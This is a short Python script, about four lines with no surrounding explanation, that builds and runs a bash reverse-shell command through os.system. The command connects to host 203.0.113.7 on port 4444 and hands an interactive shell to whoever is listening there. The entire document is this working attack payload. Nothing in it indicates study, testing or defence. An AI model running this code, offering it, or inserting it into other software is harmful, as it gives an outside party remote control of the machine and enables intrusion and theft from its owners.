import os
host = "203.0.113.7"
port = 4444
os.system("bash -i >& /dev/tcp/{}/{} 0>&1".format(host, port))
